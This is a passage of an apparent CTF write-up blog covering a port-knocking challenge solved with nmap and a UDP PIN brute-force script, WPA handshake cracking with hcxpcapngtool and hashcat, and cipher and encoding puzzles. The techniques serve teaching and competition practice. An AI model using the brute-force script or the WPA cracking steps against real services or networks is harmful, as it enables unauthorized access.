+</span></span><span style="display:flex;"><span>Nmap <span style="color:#719e07">done</span>: <span style="color:#2aa198">1</span> IP address <span style="color:#719e07">(</span><span style="color:#2aa198">1</span> host up<span style="color:#719e07">)</span> scanned in 3.42 seconds
+</span></span></code></pre></div><p>Reading again the description I assumed that this was some sort of a Bot that needs a PIN, so I tried to think on how I could  communicate with this service.</p>
+<p>I&rsquo;ve tried http, ssh, telnet, nc but nothing worked.</p>
+<p>After a while I tried to use the same code from the previous network chall and that worked, so the connection is using sockets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 send.py
+</span></span><span style="display:flex;"><span>b<span style="color:#2aa198">&#39;WRONG PIN!&#39;</span>
+</span></span></code></pre></div><p>Since this is using UDP again I did a new nmap scan for UDP instead of TCP using <code>sudo nmap -sC -sV -A -sU -p22222 -oN nmap/all opoxmas22.armysi.cc -v</code> and got</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22222/udp open  unknown
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   AFSVersionRequest, Citrix, DNS-SD, DNSStatusRequest, DNSVersionBindReq, DTLSSessionReq, Help, NBTStat, NTPRequest, NetMotionMobility, QUIC, RPCCheck, SNMPv1public, SNMPv3GetRequest, Sqlping, sybaseanywhere, xdmcp:
+</span></span><span style="display:flex;"><span>|     WRONG PIN!
+</span></span><span style="display:flex;"><span>|   Kerberos:
+</span></span><span style="display:flex;"><span>|     Opened port <span style="color:#2aa198">23590</span> - Hurry you got <span style="color:#2aa198">60</span> seconds!. Use this PIN - <span style="color:#2aa198">1882</span>
+</span></span><span style="display:flex;"><span>|   SIPOptions:
+</span></span><span style="display:flex;"><span>|_    Opened port <span style="color:#2aa198">28002</span> - Hurry you got <span style="color:#2aa198">60</span> seconds!. Use this PIN - <span style="color:#2aa198">4958</span>
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port22222-UDP:V<span style="color:#719e07">=</span>7.92%I<span style="color:#719e07">=</span>7%D<span style="color:#719e07">=</span>12/26%Time<span style="color:#719e07">=</span>63A9D15F%P<span style="color:#719e07">=</span>x86_64-pc-linux-gnu%r<span style="color:#719e07">(</span>
+</span></span><span style="display:flex;"><span>SF:RPCCheck,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>DNSVersionBindReq,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>DN
+</span></span><span style="display:flex;"><span>SF:SStatusRequest,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>NBTStat,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>Help,A
+</span></span><span style="display:flex;"><span>SF:,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>SIPOptions,42,<span style="color:#2aa198">&#34;Opened\x20port\x2028002\x20-\x20Hurr
+</span></span></span><span style="display:flex;"><span><span style="color:#2aa198">SF:y\x20you\x20got\x2060\x20seconds!\.\x20Use\x20this\x20PIN\x20-\x204958&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>Sqlping,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>NTPRequest,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>SNMPv1
+</span></span><span style="display:flex;"><span>SF:public,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>SNMPv3GetRequest,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>xdmcp
+</span></span><span style="display:flex;"><span>SF:,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>AFSVersionRequest,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>DNS-SD,A,<span style="color:#2aa198">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#2aa198">SF:WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>Citrix,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>Kerberos,42,<span style="color:#2aa198">&#34;Opened\x20po
+</span></span></span><span style="display:flex;"><span><span style="color:#2aa198">SF:rt\x2023590\x20-\x20Hurry\x20you\x20got\x2060\x20seconds!\.\x20Use\x20t
+</span></span></span><span style="display:flex;"><span><span style="color:#2aa198">SF:his\x20PIN\x20-\x201882&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>sybaseanywhere,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>NetMoti
+</span></span><span style="display:flex;"><span>SF:onMobility,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>DTLSSessionReq,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>%r<span style="color:#719e07">(</span>QUI
+</span></span><span style="display:flex;"><span>SF:C,A,<span style="color:#2aa198">&#34;WRONG\x20PIN!&#34;</span><span style="color:#719e07">)</span>;
+</span></span><span style="display:flex;"><span>Device type: webcam|power-device|general purpose|PBX|router
+</span></span><span style="display:flex;"><span>Running: AXIS embedded, CAEN embedded, Linux 2.0.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:2100_network_camera cpe:/o:linux:linux_kernel:2.0.33 cpe:/o:linux:linux_kernel:2.0.38 cpe:/o:linux:linux_kernel:2.0.39
+</span></span><span style="display:flex;"><span>Too many fingerprints match this host to give specific OS details
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#2aa198">2</span> hops
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#719e07">(</span>using port 80/tcp<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">1</span>   0.40 ms 10.0.2.2
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">2</span>   0.51 ms static.98.178.217.95.clients.your-server.de <span style="color:#719e07">(</span>95.217.178.98<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
+</span></span><span style="display:flex;"><span>Initiating NSE at 16:54
+</span></span><span style="display:flex;"><span>Completed NSE at 16:54, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 16:54
+</span></span><span style="display:flex;"><span>Completed NSE at 16:54, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 16:54
+</span></span><span style="display:flex;"><span>Completed NSE at 16:54, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#719e07">done</span>: <span style="color:#2aa198">1</span> IP address <span style="color:#719e07">(</span><span style="color:#2aa198">1</span> host up<span style="color:#719e07">)</span> scanned in 99.54 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#2aa198">30</span> <span style="color:#719e07">(</span>2.572KB<span style="color:#719e07">)</span> | Rcvd: <span style="color:#2aa198">15</span> <span style="color:#719e07">(</span>930B<span style="color:#719e07">)</span>
+</span></span></code></pre></div><p>Knowing the nmap output, I&rsquo;ve noticed that this must be Port knocking (even the Challenge name represents that like -&gt; &ldquo;Knock knock&rdquo; -&gt; &ldquo;Who&rsquo;s There&rdquo;)</p>
+<p>This took me 2 days to solve because I was stuck on how I could exploit this but after a lot of reading I&rsquo;ve noticed I already had half of exploit done. from the previous network challenge.</p>
+<p>So to build this exploit I first needed to know what pin does port <code>22222</code> accepts (I&rsquo;ve used a range from 0 to 99999 by trial/error and looks like the PIN for 22222 is 10000) and then knock two times (this is not fixed, we can configure more than 2 knock on a port knocking, but on this challenge this was 2 knocks) with the new port + new pin.</p>
+<p>I&rsquo;ve built an exploit that does this and got the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#719e07">import</span> socket 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">def</span> <span style="color:#268bd2">make_request</span>(port,pin):
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Trying with port: </span><span style="color:#2aa198">{</span>port<span style="color:#2aa198">}</span><span style="color:#2aa198"> and pin: </span><span style="color:#2aa198">{</span>pin<span style="color:#2aa198">}</span><span style="color:#2aa198">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server_add_and_port <span style="color:#719e07">=</span> (<span style="color:#2aa198">&#34;opoxmas22.armysi.cc&#34;</span>, port)                                     
+</span></span><span style="display:flex;"><span>    udp_client_socket <span style="color:#719e07">=</span> socket<span style="color:#719e07">.</span>socket(family<span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>AF_INET, <span style="color:#b58900">type</span><span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>SOCK_DGRAM)
+</span></span><span style="display:flex;"><span>    udp_client_socket<span style="color:#719e07">.</span>sendto(<span style="color:#b58900">str</span><span style="color:#719e07">.</span>encode(pin), server_add_and_port)
+</span></span><span style="display:flex;"><span>    msg_from_server <span style="color:#719e07">=</span> udp_client_socket<span style="color:#719e07">.</span>recvfrom(<span style="color:#2aa198">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#719e07">=</span> msg_from_server[<span style="color:#2aa198">0</span>]<span style="color:#719e07">.</span>decode(<span style="color:#2aa198">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">if</span> <span style="color:#2aa198">&#34;Flag&#34;</span> <span style="color:#719e07">in</span> msg:
+</span></span><span style="display:flex;"><span>        <span style="color:#b58900">print</span>(msg)
+</span></span><span style="display:flex;"><span>        <span style="color:#719e07">return</span> 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    port, pin <span style="color:#719e07">=</span> msg<span style="color:#719e07">.</span>split(<span style="color:#2aa198">&#34; &#34;</span>)[<span style="color:#2aa198">2</span>], msg<span style="color:#719e07">.</span>split(<span style="color:#2aa198">&#34; &#34;</span>)[<span style="color:#719e07">-</span><span style="color:#2aa198">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">return</span> port, pin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">def</span> <span style="color:#268bd2">brute_force</span>():
+</span></span><span style="display:flex;"><span>    server_add_and_port <span style="color:#719e07">=</span> (<span style="color:#2aa198">&#34;opoxmas22.armysi.cc&#34;</span>, <span style="color:#2aa198">22222</span>)                                                           
+</span></span><span style="display:flex;"><span>    udp_client_socket <span style="color:#719e07">=</span> socket<span style="color:#719e07">.</span>socket(family<span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>AF_INET, <span style="color:#b58900">type</span><span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>SOCK_DGRAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#586e75"># try and find the PIN for the 22222 port</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">for</span> i <span style="color:#719e07">in</span> <span style="color:#b58900">range</span>(<span style="color:#2aa198">10000</span>,<span style="color:#2aa198">99999</span>):
+</span></span><span style="display:flex;"><span>        udp_client_socket<span style="color:#719e07">.</span>sendto(<span style="color:#b58900">str</span><span style="color:#719e07">.</span>encode(<span style="color:#b58900">str</span>(i)), server_add_and_port)
+</span></span><span style="display:flex;"><span>        msg_from_server <span style="color:#719e07">=</span> udp_client_socket<span style="color:#719e07">.</span>recvfrom(<span style="color:#2aa198">1024</span>)
+</span></span><span style="display:flex;"><span>        msg <span style="color:#719e07">=</span> msg_from_server[<span style="color:#2aa198">0</span>]<span style="color:#719e07">.</span>decode(<span style="color:#2aa198">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#719e07">if</span> msg <span style="color:#719e07">!=</span> <span style="color:#2aa198">&#34;WRONG PIN!&#34;</span>:
+</span></span><span style="display:flex;"><span>            port, pin <span style="color:#719e07">=</span> msg<span style="color:#719e07">.</span>split(<span style="color:#2aa198">&#34; &#34;</span>)[<span style="color:#2aa198">2</span>], msg<span style="color:#719e07">.</span>split(<span style="color:#2aa198">&#34; &#34;</span>)[<span style="color:#719e07">-</span><span style="color:#2aa198">1</span>]
+</span></span><span style="display:flex;"><span>            port, pin <span style="color:#719e07">=</span> make_request(<span style="color:#b58900">int</span>(port),<span style="color:#b58900">str</span>(pin))
+</span></span><span style="display:flex;"><span>            make_request(<span style="color:#b58900">int</span>(port),<span style="color:#b58900">str</span>(pin))
+</span></span><span style="display:flex;"><span>            <span style="color:#719e07">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">if</span> <span style="color:#268bd2">__name__</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    brute_force()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 send.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Trying with port: <span style="color:#2aa198">29475</span> and pin: <span style="color:#2aa198">9379</span>
+</span></span><span style="display:flex;"><span>Trying with port: <span style="color:#2aa198">28414</span> and pin: <span style="color:#2aa198">6313</span>
+</span></span><span style="display:flex;"><span>Flag<span style="color:#719e07">{</span>Kito_KitoWho?_MosKito<span style="color:#719e07">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>Kito_KitoWho?_MosKito<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="my-network-is-secure">My Network Is Secure!<a hidden class="anchor" aria-hidden="true" href="#my-network-is-secure">#</a></h3>
+<p><em>&ldquo;Taberna belga said their free WiFi is secure because it has a password, however people are still getting passwords! How is this possible?!&rdquo;</em></p>
+<p>After opening the cap file in in wireshark I&rsquo;ve noticed the data on the communication process is encripted, probably because they are using wpa with some passphrase so this is encrypted.</p>
+<p>Since this is from a Wifi network we know we need to try to get the wpa-pwd to decrypt the communication from the protocol IEEEE802.11.</p>
+<p>Next thing I did was to find a way to grab the encrypted password so I could use the rockyou.txt wordlist with hashcat to try to crack it.</p>
+<p>A cool way to grab the encrypted password and make it hashcat readable is to use <code>hcxpcapngtool</code> (Portable solution for capturing wlan traffic and conversion to hashcat formats (recommended by hashcat) and to John the Ripper formats).</p>
+<p>So I did that and got a WPA hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hcxpcapngtool -o <span style="color:#b58900">hash</span> SecuredNetwork.cap
+</span></span><span style="display:flex;"><span>$ cat <span style="color:#b58900">hash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WPA*02*4ca8dcfc1ae47ae4c892d2cc25f4e1e5*907841398870*d6a78c062e85*5365637572654e65742057696669*3ca0a8709bf3a4dc5041041109b41f01565f7b5a30608ed4c02e5c4f523e4be3*01030077fe01090020000000000000000110f11a201a62f4f081e097ee34d8c20f84822bb6aa0ab4c0af3423657187dbf80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20201000050f202*02
+</span></span></code></pre></div><p>Next I searched for the mode for WPA hashes in hashcat and runed that with rockyou and got the password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat -m <span style="color:#2aa198">22000</span> wandshakes /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#719e07">(</span>v6.1.1<span style="color:#719e07">)</span> starting...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache built:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#2aa198">14344392</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#2aa198">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#2aa198">14344385</span>
+</span></span><span style="display:flex;"><span>* Runtime...: <span style="color:#2aa198">1</span> sec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>4ca8dcfc1ae47ae4c892d2cc25f4e1e5:907841398870:d6a78c062e85:SecureNet Wifi:spiderman
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
+</span></span></code></pre></div><p>So now I have the SID + the password.</p>
+<p>The SID was already known because it was plaintext on the pcap file.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209825910-54b4ef33-ba0c-4223-911f-80ea522b18bc.png"></p>
+<p>Now I needed to insert the password:SID on wireshark so I could check the communication</p>
+<p>So I did <code>Edit</code> -&gt; <code>Preferences</code> -&gt; <code>Protocols</code> and searched for IEEE802.11 and added the decryption key.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209826143-dc845df8-9881-4c04-a2d2-7e1c2b14af70.png"></p>
+<p>After pressing <code>ok</code> I got more traffic but the one I looked for was the tcp.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209826261-03034a13-829d-4fa9-bd88-a3ece14f41e5.png"></p>
+<p>Following the TCP STREAM I got the flag.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209826389-dad5d0b2-b352-483a-b50b-b35a62cf351a.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>morestudy<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h2 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h2>
+<h3 id="mmmm-donuts">Mmmm Donuts<a hidden class="anchor" aria-hidden="true" href="#mmmm-donuts">#</a></h3>
+<p><em>&ldquo;Donuts are the best breakfast food! There is a donut flavor for everyone&rsquo;s taste, they pair great with coffee, and they can be eaten on the go! The key to solve this challenge is the most important meal of the day. If one donut doesn&rsquo;t help, try having another. You better solve it fast before you get diabetes. PS: My favorite donut is the original, just glazed.&rdquo;</em></p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/219748476-887b27b5-0802-4aa1-bf1a-3ce6082dad32.png"></p>
+<p>This was a hard one for me since I don&rsquo;t know much about crypto ctfs and the description was not good enough.</p>
+<p>But after getting some hits, I&rsquo;ve found that this was using bacon-cipher.</p>
+<p>Implementing bacon-cipher decryption on the image I got the following</p>
+<ul>
+<li>a
+<ul>
+<li>not bold</li>
+</ul>
+</li>
+<li>b
+<ul>
+<li>bold</li>
+</ul>
+</li>
+</ul>
+<p><code>aaba bbaaaa bab ab ababb ab bab aba aabaa aaaaaa aa abb aab ab aa aab bab aaa</code></p>
+<p>Then I used vigenere-cipher with the key <code>breakfast</code> and got the flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>eatmedrinkme<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="lets-share">Lets Share!<a hidden class="anchor" aria-hidden="true" href="#lets-share">#</a></h3>
+<p><em>&ldquo;Encoding is the process of converting data from one format into another, typically for the purposes of efficient transmission or storage. There are many different types of encoding schemes that can be used, depending on the specific requirements of the data and the intended use. Encoding is an important aspect of data management and is used in a variety of applications, including networking, data storage, and multimedia.&rdquo;</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat coded_data.txt 
+</span></span><span style="display:flex;"><span>JTI2JTIzOTAlM0IlMjYlMjMxMDklM0IlMjYlMjMxMjAlM0IlMjYlMjMxMDQlM0IlMjYlMjM5MCUzQiUyNiUyMzUxJTNCJTI2JTIzMTE2JTNCJTI2JTIzMTA1JTNCJTI2JTIzNzclM0IlMjYlMjM3MSUzQiUyNiUyMzExOSUzQiUyNiUyMzExOSUzQiUyNiUyMzg4JTNCJTI2JTIzNTElM0IlMjYlMjM3MyUzQiUyNiUyMzEyMiUzQiUyNiUyMzc3JTNCJTI2JTIzODYlM0IlMjYlMjM1NyUzQiUyNiUyMzcxJTNCJTI2JTIzODYlM0IlMjYlMjM3MCUzQiUyNiUyMzEwMCUzQiUyNiUyMzU3JTNC
+</span></span></code></pre></div><p>Looking at txt file at first sight I saw that this was use base64 so I put on Cybechef and used the <code>Magic</code> recipe but that didn&rsquo;t do much.</p>
+<p>Knowing this I tried to help Cyberchef by already providing the base64 decoded string and that got me the flag.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209560953-52a14089-9126-402f-96c6-c7e5627069a8.png"></p>
+<p>I wanted to understand how many encodings were happening here so I did a python script to help me on this and by trial/error I&rsquo;ve managed to found that this was using 4 encodings</p>
+<p>base64 -&gt; url encoding -&gt; HTML entity encoding -&gt; base64</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#719e07">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#719e07">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#719e07">import</span> html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">with</span> <span style="color:#b58900">open</span>(<span style="color:#2aa198">&#34;coded_data.txt&#34;</span>, <span style="color:#2aa198">&#34;r&#34;</span>) <span style="color:#719e07">as</span> f:
+</span></span><span style="display:flex;"><span>    stage_1 <span style="color:#719e07">=</span> f<span style="color:#719e07">.</span>readline()<span style="color:#719e07">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Stage 1 -&gt; </span><span style="color:#2aa198">{</span>stage_1<span style="color:#2aa198">}</span><span style="color:#cb4b16">\n</span><span style="color:#2aa198">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    stage_2 <span style="color:#719e07">=</span> base64<span style="color:#719e07">.</span>b64decode(stage_1)<span style="color:#719e07">.</span>decode(<span style="color:#2aa198">&#34;utf-8&#34;</span>) 
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Stage 2 -&gt; </span><span style="color:#2aa198">{</span>stage_2<span style="color:#2aa198">}</span><span style="color:#cb4b16">\n</span><span style="color:#2aa198">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    stage_3 <span style="color:#719e07">=</span> urllib<span style="color:#719e07">.</span>parse<span style="color:#719e07">.</span>unquote(stage_2)
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Stage 3 -&gt; </span><span style="color:#2aa198">{</span>stage_3<span style="color:#2aa198">}</span><span style="color:#cb4b16">\n</span><span style="color:#2aa198">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    stage_4 <span style="color:#719e07">=</span> html<span style="color:#719e07">.</span>unescape(stage_3)
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Stage 4 -&gt; </span><span style="color:#2aa198">{</span>stage_4<span style="color:#2aa198">}</span><span style="color:#cb4b16">\n</span><span style="color:#2aa198">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    stage_5 <span style="color:#719e07">=</span> base64<span style="color:#719e07">.</span>b64decode(stage_4)<span style="color:#719e07">.</span>decode(<span style="color:#2aa198">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#b58900">print</span>(<span style="color:#2aa198">f</span><span style="color:#2aa198">&#34;Stage 5 -&gt; </span><span style="color:#2aa198">{</span>stage_5<span style="color:#2aa198">}</span><span style="color:#cb4b16">\n</span><span style="color:#2aa198">&#34;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 uncoded.py 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stage <span style="color:#2aa198">1</span> -&gt; JTI2JTIzOTAlM0IlMjYlMjMxMDklM0IlMjYlMjMxMjAlM0IlMjYlMjMxMDQlM0IlMjYlMjM5MCUzQiUyNiUyMzUxJTNCJTI2JTIzMTE2JTNCJTI2JTIzMTA1JTNCJTI2JTIzNzclM0IlMjYlMjM3MSUzQiUyNiUyMzExOSUzQiUyNiUyMzExOSUzQiUyNiUyMzg4JTNCJTI2JTIzNTElM0IlMjYlMjM3MyUzQiUyNiUyMzEyMiUzQiUyNiUyMzc3JTNCJTI2JTIzODYlM0IlMjYlMjM1NyUzQiUyNiUyMzcxJTNCJTI2JTIzODYlM0IlMjYlMjM3MCUzQiUyNiUyMzEwMCUzQiUyNiUyMzU3JTNC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stage <span style="color:#2aa198">2</span> -&gt; %26%2390%3B%26%23109%3B%26%23120%3B%26%23104%3B%26%2390%3B%26%2351%3B%26%23116%3B%26%23105%3B%26%2377%3B%26%2371%3B%26%23119%3B%26%23119%3B%26%2388%3B%26%2351%3B%26%2373%3B%26%23122%3B%26%2377%3B%26%2386%3B%26%2357%3B%26%2371%3B%26%2386%3B%26%2370%3B%26%23100%3B%26%2357%3B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stage <span style="color:#2aa198">3</span> -&gt; &amp;<span style="color:#586e75">#90;&amp;#109;&amp;#120;&amp;#104;&amp;#90;&amp;#51;&amp;#116;&amp;#105;&amp;#77;&amp;#71;&amp;#119;&amp;#119;&amp;#88;&amp;#51;&amp;#73;&amp;#122;&amp;#77;&amp;#86;&amp;#57;&amp;#71;&amp;#86;&amp;#70;&amp;#100;&amp;#57;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stage <span style="color:#2aa198">4</span> -&gt; ZmxhZ3tiMGwwX3IzMV9GVFd9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stage <span style="color:#2aa198">5</span> -&gt; flag<span style="color:#719e07">{</span>b0l0_r31_FTW<span style="color:#719e07">}</span>
